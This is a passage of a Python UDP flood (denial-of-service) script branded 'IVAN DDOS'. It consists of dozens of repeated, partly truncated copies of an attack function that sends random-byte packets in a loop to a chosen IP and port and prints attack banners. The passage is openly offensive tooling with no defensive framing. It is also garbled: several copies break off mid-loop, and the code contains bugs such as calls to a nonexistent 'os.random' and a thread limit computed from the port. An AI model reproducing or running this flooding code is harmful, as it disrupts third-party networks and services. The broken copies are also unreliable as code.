        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Selesai')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Selesai')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
